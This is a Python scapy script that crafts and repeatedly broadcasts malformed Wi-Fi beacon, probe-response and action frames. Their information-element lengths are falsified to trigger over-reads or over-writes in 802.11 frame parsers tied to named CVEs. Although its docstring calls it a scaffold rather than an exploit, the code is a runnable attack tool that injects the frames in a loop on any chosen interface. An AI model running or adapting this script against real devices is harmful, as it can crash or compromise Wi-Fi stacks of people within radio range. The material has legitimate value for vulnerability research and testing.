#!/usr/bin/env python3
"""
beacon_ie_overflow.py — SCAFFOLD, not an exploit.

Target : CVE-2026-113909 / CVE-2026-112622 / CVE-2026-112620 (Wi-Fi)
Theory : a host-side 802.11 frame parser walks the information-element (IE)
         chain without checking that `ie_len` fits in the remaining frame,
         so an oversized IE over-reads (or over-writes a fixed IE buffer).
Usage  : sudo python3 beacon_ie_overflow.py <iface> <mode>
         mode: vendor | rates | action
Requires: scapy, a monitor+injection capable card.
"""

import sys
import struct

try:
    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, \
        Dot11ProbeResp, Dot11EltVendorSpecific, sendp
    HAVE_SCAPY = True
except ImportError:
    HAVE_SCAPY = False

BROADCAST = "ff:ff:ff:ff:ff:ff"

def build_vendor_ie_overflow():
    """
    Beacon with a vendor-specific IE whose declared length (200) exceeds the
    remaining frame bytes (10). A parser that trusts ie_len over-reads.
    """
    if not HAVE_SCAPY:
        return None
    # Real vendor IE body is short; we lie about the length via a raw tail.
    ssid = Dot11Elt(ID=0, info=b"evil")
    # Vendor IE: OUI 00:11:22, then a body that is only 6 bytes, but the
    # enclosing IE header claims 200.
    vendor_payload = b"\x00\x11\x22" + b"\x41" * 6
    # Craft the raw IE manually so the length byte disagrees with the tail.
    raw_ie = bytes([221, 200]) + vendor_payload
    # An IE that would be well-formed if there were 200 bytes following.
    # We put it at the very end of the frame.
    frame = (RadioTap() /
             Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=BROADCAST,
                   addr3=BROADCAST) /
             Dot11Beacon(cap="ESS") /
             ssid)
    # Append the malformed IE as raw bytes.
    frame = frame / raw_ie
    return frame

def build_bad_rates_ie():
    """
    Probe response with a Supported Rates IE whose length is 0, but whose
    consumer reads a fixed 8-byte array.
    """
    if not HAVE_SCAPY:
        return None
    ssid = Dot11Elt(ID=0, info=b"x")
    bad_rates = bytes([1, 0])  # IE 1 (Supported Rates), len 0
    frame = (RadioTap() /
             Dot11(type=0, subtype=5, addr1=BROADCAST, addr2=BROADCAST,
                   addr3=BROADCAST) /
             Dot11ProbeResp(cap="ESS") /
             ssid /
             bad_rates)
    return frame

def build_bad_action_frame():
    """
    Spectrum measurement action frame with a length field larger than the
    frame.
    """
    if not HAVE_SCAPY:
        return None
    # Action frame: category 0 (spectrum mgmt), action 0, then a bogus length.
    action_body = bytes([0, 0, 0xFF, 0xFF]) + b"\x42" * 4
    frame = (RadioTap() /
             Dot11(type=0, subtype=13, addr1=BROADCAST, addr2=BROADCAST,
                   addr3=BROADCAST) /
             action_body)
    return frame

def main():
    if not HAVE_SCAPY:
        sys.stderr.write("scapy not installed: pip install scapy\n")
        return 2
    if len(sys.argv) != 3:
        sys.stderr.write(__doc__)
        return 2
    iface, mode = sys.argv[1], sys.argv[2]
    builders = {"vendor": build_vendor_ie_overflow,
                "rates":  build_bad_rates_ie,
                "action": build_bad_action_frame}
    if mode not in builders:
        sys.stderr.write(__doc__)
        return 2
    frame = builders[mode]()
    if frame is None:
        sys.stderr.write("failed to build frame\n")
        return 1
    print("[*] sending %s frame on %s (Ctrl-C to stop)" % (mode, iface))
    # Repeat so the target has many chances to parse it.
    sendp(frame, iface=iface, loop=1, inter=0.05)
    return 0

if __name__ == "__main__":
    sys.exit(main())
